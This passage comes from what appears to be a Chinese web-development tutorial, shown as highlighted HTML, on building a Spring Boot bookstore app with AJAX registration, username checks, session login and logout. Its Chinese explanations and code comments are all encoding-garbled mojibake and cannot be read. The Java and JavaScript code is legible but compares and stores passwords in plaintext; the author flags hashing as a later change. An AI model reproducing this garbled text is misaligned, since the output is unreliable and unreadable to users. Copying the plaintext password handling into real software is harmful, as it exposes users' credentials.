<span class="keyword">else</span> &#123;</span><br><span class="line">                $(<span class="string">&quot;#pwdTip&quot;</span>).<span class="title function_">css</span>(<span class="string">&quot;display&quot;</span>,<span class="string">&quot;block&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ajaxå¼‚æ­¥å‘é€postè¯·æ±‚ï¼Œurlè·¯å¾„ä¸ºwebåº”ç”¨è·¯å¾„+&#x2F;user&#x2F;loginï¼Œå¯¹è¡¨å•è¿›è¡Œåºåˆ—åŒ–åä¼ é€’æ•°æ®ï¼Œç™»å½•æˆåŠŸè·³è½¬åˆ°&#x2F;book&#x2F;index</p><p>æŠŠlogin_reg.jsåµŒå…¥åˆ°index.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">th:src</span>=<span class="string">&quot;@&#123;/js/login_reg.js&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>registerä¹Ÿä¸€æ ·</p><p>ä¸‹é¢ç»†åŒ–ä¸€äº›åŠŸèƒ½ï¼š</p><h3 id="æ³¨å†Œç”¨æˆ·åæ˜¯å¦é‡å¤çš„éªŒè¯"><a href="#æ³¨å†Œç”¨æˆ·åæ˜¯å¦é‡å¤çš„éªŒè¯" class="headerlink" title="æ³¨å†Œç”¨æˆ·åæ˜¯å¦é‡å¤çš„éªŒè¯"></a>æ³¨å†Œç”¨æˆ·åæ˜¯å¦é‡å¤çš„éªŒè¯</h3><p>åœ¨æ³¨å†Œç”¨æˆ·åå¤„æ·»åŠ ä¸€ä¸ªåŠŸèƒ½ï¼šå…‰æ ‡ç§»å‡ºè¾“å…¥æ¡†æ—¶ï¼Œè‡ªåŠ¨éªŒè¯ç”¨æˆ·åæ˜¯å¦å­˜åœ¨ï¼Œç”¨onbluräº‹ä»¶å®ç°ï¼ŒthisæŒ‡å½“å‰å…ƒç´ è‡ªèº«ï¼Œä¹Ÿå°±æ˜¯username</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">class</span>=<span class="string">&quot;form-control&quot;</span> <span class="attr">required</span> <span class="attr">placeholder</span>=<span class="string">&quot;å°å†™å­—æ¯å¼€å¤´,ä¸å«ä¸­æ–‡.&quot;</span> <span class="attr">th:onblur</span>=<span class="string">&quot;|checkUser(this)|&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>checkUserçš„å®ç°ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">checkUser</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    $.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">        <span class="attr">url</span>: contextPath + <span class="string">&quot;/user/checkUserName&quot;</span>,</span><br><span class="line">        <span class="attr">data</span>:&#123;<span class="string">&quot;username&quot;</span>:obj.<span class="property">value</span>&#125;,</span><br><span class="line">        <span class="attr">method</span>:<span class="string">&quot;post&quot;</span>,</span><br><span class="line">        <span class="attr">success</span>:<span class="keyword">function</span> (<span class="params">data</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (data == <span class="number">102</span>) &#123;<span class="comment">//ç”¨æˆ·å­˜åœ¨</span></span><br><span class="line">                $(<span class="string">&quot;#tip&quot;</span>).<span class="title function_">html</span>(<span class="string">&quot;ç”¨æˆ·åä¸åˆæ³•&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $(<span class="string">&quot;#tip&quot;</span>).<span class="title function_">html</span>(<span class="string">&quot;ç”¨æˆ·åå¯ä»¥æ³¨å†Œ&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>å…¶ä¸­success:functionçš„éƒ¨åˆ†ï¼šè¿™æ˜¯ä¸€ä¸ª AJAX è¯·æ±‚çš„å›è°ƒå‡½æ•°ï¼Œå½“è¯·æ±‚æˆåŠŸæ—¶ä¼šæ‰§è¡Œæ­¤å‡½æ•°ã€‚</p></blockquote><p>åç«¯éƒ¨åˆ†ï¼ŒåŒæ ·çš„ï¼Œéœ€è¦è¿æ¥æ•°æ®åº“ï¼Œå’Œå‰é¢å›¾ä¹¦çš„å®ä½“ç±»ä¸€æ ·ï¼Œç”¨@Dataè‡ªåŠ¨ç”Ÿæˆgetterå’Œsetterï¼Œ@TableNameæŒ‡å®šæ•°æ®è¡¨ï¼ŒIdType.AUTOè‡ªå¢ä¸»é”®</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@TableName(value = &quot;bs_user&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="meta">@TableId(type = IdType.AUTO)</span></span><br><span class="line">    <span class="keyword">private</span> Integer id;</span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¹¶å»ºç«‹å…¶mapperå’Œservice:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Mapper</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserMapper</span> <span class="keyword">extends</span> <span class="title class_">BaseMapper</span>&lt;User&gt; &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserService</span> <span class="keyword">extends</span> <span class="title class_">ServiceImpl</span>&lt;UserMapper, User&gt; &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå°±ä¸åœ¨controllerå†™éªŒè¯äº†ï¼Œåœ¨ä¸šåŠ¡å±‚çš„serviceå†™ä¹Ÿå¯ä»¥</p><p>åŒæ ·çš„ï¼Œæ³¨å†ŒMapperï¼Œç„¶åç”¨mybatisæä¾›çš„selectOneæ–¹æ³•åœ¨æ•°æ®åº“ä¸­è¿›è¡ŒæŸ¥æ‰¾</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserService</span> <span class="keyword">extends</span> <span class="title class_">ServiceImpl</span>&lt;UserMapper, User&gt; &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> UserMapper userMapper;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">checkUser</span><span class="params">(String username)</span>&#123;</span><br><span class="line">        QueryWrapper&lt;User&gt; queryWrapper = <span class="keyword">new</span> <span class="title class_">QueryWrapper</span>&lt;&gt;();</span><br><span class="line">        queryWrapper.eq(<span class="string">&quot;username&quot;</span>,username);</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> userMapper.selectOne(queryWrapper);</span><br><span class="line">        <span class="keyword">if</span>(user == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;101&quot;</span>;<span class="comment">//ç”¨æˆ·åä¸é‡å¤</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;102&quot;</span>;<span class="comment">//ç”¨æˆ·å·²å­˜åœ¨</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨controlleré‡Œè°ƒç”¨ä¸€ä¸‹serviceçš„æ–¹æ³•ï¼Œå¹¶æŠŠç»“æœï¼ˆâ€101â€æˆ–â€102â€ï¼‰å†™è¿›responseBody:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/user&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserController</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> UserService userService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/checkUserName&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">checkUserName</span><span class="params">(String username)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> userService.checkUser(username);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ ·åœ¨å‰ç«¯æ ¹æ®101æˆ–102å°±èƒ½æ˜¾ç¤ºä¸åŒçš„ä¿¡æ¯äº†</p><ul><li>æµ‹è¯•ï¼š</li></ul><p>æ•°æ®åº“ä¸­ç°åœ¨æœ‰çš„ç”¨æˆ·å¦‚ä¸‹ï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230514201007371.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230514201007371.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è¾“å…¥ä¸€ä¸ªæ•°æ®åº“ä¸­æ²¡æœ‰çš„ç”¨æˆ·ï¼Œç„¶åç¦»å¼€è¾“å…¥æ¡†ï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230514200929817.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230514200929817.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è¾“å…¥æ•°æ®åº“ä¸­æœ‰çš„jackç”¨æˆ·ï¼Œç„¶åç¦»å¼€è¾“å…¥æ¡†ï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230514201155674.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230514201155674.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="æ³¨å†Œä¿¡æ¯"><a href="#æ³¨å†Œä¿¡æ¯" class="headerlink" title="æ³¨å†Œä¿¡æ¯"></a>æ³¨å†Œä¿¡æ¯</h3><p>ç±»ä¼¼äºcheckUserNameï¼Œregistryçš„å‰ç«¯å†™æ³•å‡ ä¹ä¸€æ¨¡ä¸€æ ·,æŠŠregFormè¡¨å•çš„æ•°æ®åºåˆ—åŒ–åè¿›è¡Œä¼ é€’ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">register</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> datas = $(<span class="string">&quot;#regForm&quot;</span>).<span class="title function_">serialize</span>();</span><br><span class="line">    $.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">        <span class="attr">url</span>: contextPath + <span class="string">&quot;/user/register&quot;</span>,</span><br><span class="line">        <span class="attr">data</span>:datas,</span><br><span class="line">        <span class="attr">method</span>:<span class="string">&quot;post&quot;</span>,</span><br><span class="line">        <span class="attr">success</span>:<span class="keyword">function</span> (<span class="params">data</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(data == <span class="string">&#x27;success&#x27;</span>)&#123;</span><br><span class="line">                <span class="title function_">alert</span>(<span class="string">&quot;æ³¨å†ŒæˆåŠŸï¼Œè¯·ç™»å½•ï¼&quot;</span>);</span><br><span class="line">                $(<span class="string">&quot;#register&quot;</span>).<span class="title function_">modal</span>(<span class="string">&#x27;hide&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åç«¯ä¹Ÿæ˜¯ï¼Œå…³é”®çš„å°±ä¸€æ­¥ï¼ŒæŠŠæ¥æ”¶åˆ°çš„userç±»é€šè¿‡userService.save()å†™å…¥æ•°æ®åº“</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/register&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">register</span><span class="params">(User user)</span>&#123;</span><br><span class="line">        userService.save(user);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>æµ‹è¯•ï¼š</li></ul><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230514204340322.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230514204340322.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åœ¨navicatåˆ·æ–°å¯ä»¥çœ‹åˆ°ï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230514204630356.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230514204630356.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æ§åˆ¶å°æœ‰ç›¸åº”çš„æŸ¥è¯¢å’Œæ’å…¥çš„sqlè¯­å¥ï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230514204707357.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230514204707357.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ï¼ˆåæœŸæ”¹é€ ï¼šå¯†ç æ”¹ä¸ºhashå­˜å‚¨ï¼Œç™»å½•æ”¹ä¸ºhashæ ¡éªŒï¼‰</p><h2 id="ç™»å½•åŠŸèƒ½ï¼ˆsessionæŒä¹…åŒ–ï¼‰"><a href="#ç™»å½•åŠŸèƒ½ï¼ˆsessionæŒä¹…åŒ–ï¼‰" class="headerlink" title="ç™»å½•åŠŸèƒ½ï¼ˆsessionæŒä¹…åŒ–ï¼‰"></a>ç™»å½•åŠŸèƒ½ï¼ˆsessionæŒä¹…åŒ–ï¼‰</h2><p>ajaxæäº¤è¡¨å•è·Ÿæ³¨å†Œä¸€æ ·ï¼Œä¸è¿‡ç™»å½•åªéœ€è¦ä¸¤ä¸ªinputï¼Œä¸€ä¸ªusernameï¼Œä¸€ä¸ªpassword</p><p>åœ¨UserServiceåŠ ç™»å½•éªŒè¯ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">loginCheck</span><span class="params">(User loginUser)</span>&#123;</span><br><span class="line">    QueryWrapper&lt;User&gt; queryWrapper = <span class="keyword">new</span> <span class="title class_">QueryWrapper</span>&lt;&gt;();</span><br><span class="line">    queryWrapper.eq(<span class="string">&quot;username&quot;</span>,loginUser.getUsername());</span><br><span class="line">    <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> userMapper.selectOne(queryWrapper);</span><br><span class="line">    <span class="keyword">if</span>(user == <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;101&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(loginUser.getPassword().equals(user.getPassword())) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;100&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;102&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­101å¯¹åº”ç”¨æˆ·åé”™è¯¯ï¼Œ100å¯¹åº”ç™»å½•æˆåŠŸï¼Œ102å¯¹åº”å¯†ç é”™è¯¯</p><p>ç›¸åº”çš„ï¼Œåœ¨jsçš„ä»£ç ä¸Šï¼Œæ ¹æ®è¿”å›å€¼çš„ä¸åŒï¼Œ100å°±ç™»å½•æˆåŠŸï¼Œè·³è½¬è‡³é¦–é¡µï¼Œ101å°±æ”¹å˜ç”¨æˆ·åçš„cssï¼Œå¯†ç é”™è¯¯å°±æ”¹å˜å¯†ç çš„æç¤º</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ç”¨æˆ·ç™»å½•</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">login</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> datas = $(<span class="string">&quot;#loginForm&quot;</span>).<span class="title function_">serialize</span>();</span><br><span class="line">    $.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">        <span class="attr">url</span>: contextPath + <span class="string">&quot;/user/login&quot;</span>,</span><br><span class="line">        <span class="attr">data</span>:datas,</span><br><span class="line">        <span class="attr">method</span>:<span class="string">&quot;post&quot;</span>,</span><br><span class="line">        <span class="attr">success</span>:<span class="keyword">function</span> (<span class="params">data</span>) &#123;</span><br><span class="line">            $(<span class="string">&quot;#userTip&quot;</span>).<span class="title function_">css</span>(<span class="string">&quot;display&quot;</span>,<span class="string">&quot;none&quot;</span>);</span><br><span class="line">            $(<span class="string">&quot;#pwdTip&quot;</span>).<span class="title function_">css</span>(<span class="string">&quot;display&quot;</span>,<span class="string">&quot;none&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(data == <span class="number">100</span>)&#123;</span><br><span class="line">                $(<span class="string">&quot;#loginModal&quot;</span>).<span class="title function_">modal</span>(<span class="string">&#x27;hide&#x27;</span>);</span><br><span class="line">                <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = contextPath + <span class="string">&quot;/book/index&quot;</span>;</span><br><span class="line">            &#125;  <span class="keyword">else</span> <span class="keyword">if</span>(data == <span class="number">101</span>) &#123;</span><br><span class="line">                $(<span class="string">&quot;#userTip&quot;</span>).<span class="title function_">css</span>(<span class="string">&quot;display&quot;</span>,<span class="string">&quot;block&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $(<span class="string">&quot;#pwdTip&quot;</span>).<span class="title function_">css</span>(<span class="string">&quot;display&quot;</span>,<span class="string">&quot;block&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>æµ‹è¯•ï¼š</li></ul><p>è¿˜æ˜¯ä¹‹å‰çš„æ•°æ®åº“ç”¨æˆ·ï¼Œæœ‰ç”¨æˆ·åä¸ºjackï¼Œå¯†ç ä¸º123456çš„ç”¨æˆ·</p><p>è¾“å…¥ä¸å­˜åœ¨çš„ç”¨æˆ·ï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230514212615897.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230514212615897.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è¾“å…¥é”™è¯¯çš„å¯†ç ï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230514212631022.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230514212631022.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è¾“å…¥æ­£ç¡®çš„è´¦æˆ·å¯†ç ï¼šä¼šç›´æ¥è·³è½¬è‡³é¦–é¡µï¼Œè¿™ä¸ªæ—¶å€™å°±å‘ç°äº†ä¸€ä¸ªé—®é¢˜ï¼Œæˆ‘æ²¡æœ‰åšæŒä¹…åŒ–çš„ç™»å½•æ ¡éªŒï¼Œæ‰€ä»¥éªŒè¯æˆåŠŸäº†å°±æ²¡æœ‰åç»­äº†ï¼Œé¡µé¢æ²¡æœ‰å‘ç”Ÿä»»ä½•æ”¹å˜</p><ul><li>åšæŒä¹…åŒ–ï¼Œå°±æŠŠç™»å½•æˆåŠŸçš„ä¿¡æ¯å†™è¿›session:</li></ul><p>ç™»å½•æˆåŠŸåï¼Œå°±æŠŠæ•´ä¸ªuserå¯¹è±¡æ”¾è¿›session</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(loginUser.getPassword().equals(user.getPassword())) &#123;</span><br><span class="line">    session.setAttribute(<span class="string">&quot;user&quot;</span>,user);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;100&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç™»é™†æˆåŠŸåï¼Œè¿™é‡Œå°±æŠŠå¯¼èˆªæ çš„ç™»å½•å’Œæ³¨å†Œæ¢æ‰äº†ï¼š</p><p>sessionä¸ºç©ºçš„æ—¶å€™æ‰æ˜¾ç¤ºç™»å½•å’Œæ³¨å†Œï¼Œsessionä¸ä¸ºç©ºè¯´æ˜å·²ç»ç™»å½•æˆåŠŸï¼Œåˆ™åº”è¯¥æ˜¾ç¤ºç”¨æˆ·åï¼Œè¿˜æœ‰é€€å‡ºç™»å½•çš„æŒ‰é’®ã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230514213604285.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230514213604285.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åŠ ä¸Šlogoutçš„åŠŸèƒ½ï¼š</p><p>è°ƒç”¨session.invalidate()å°†sessionç½®ç©ºï¼Œè¿™æ ·å°±é€€å‡ºç™»å½•äº†ï¼Œç„¶åä½¿ç”¨redirecté‡å®šå‘è‡³é¦–é¡µ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/logout&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">logout</span><span class="params">(HttpSession session)</span>&#123;</span><br><span class="line">    session.invalidate();</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;redirect:/home/index&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>æµ‹è¯•ï¼šæœªç™»å½•æ—¶ï¼š</li></ul><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230514213826101.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230514213826101.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ç™»é™†åï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230514214954698.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230514214954698.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h2 id="å›¾ä¹¦ç±»å‹ï¼ˆåˆ†ç±»å±•ç¤ºï¼‰"><a href="#å›¾ä¹¦ç±»å‹ï¼ˆåˆ†ç±»å±•ç¤ºï¼‰" class="headerlink" title="å›¾ä¹¦ç±»å‹ï¼ˆåˆ†ç±»å±•ç¤ºï¼‰"></a>å›¾ä¹¦ç±»å‹ï¼ˆåˆ†ç±»å±•ç¤ºï¼‰</h2><p>åœ¨é¦–é¡µçš„å¯¼èˆªæ é‡Œï¼Œè¿™ä¸‰ä¸ªåŠŸèƒ½è¿˜æœªå®ç°ï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230518091427407.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230518091427407.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><ul><li>å¦‚ç²¾é€‰å›¾ä¹¦é¡µï¼š</li></ul><p>å¯¼èˆªèœå•ç”¨th:hrefè·³è½¬åˆ°æ–°é¡µ</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;books_list.html&quot;</span> <span class="attr">th:href</span>=<span class="string">&quot;@&#123;/book/bookList(category=1)&#125;&quot;</span>&gt;</span>ç²¾é€‰å›¾ä¹¦<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br></pre></td></tr></table></figure><p>åœ¨BookControllerä¸‹ï¼Œåˆ†ç±»å½“ç„¶è¦æ ¹æ®å®šä¹‰çš„categoryæ¥åˆ†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/bookList&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">bookList</span><span class="params">(String category,Model model)</span>&#123;</span><br><span class="line">    model.addAttribute(<span class="string">&quot;category&quot;</span>,category);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;books_list&quot;</span>;</span><br><span 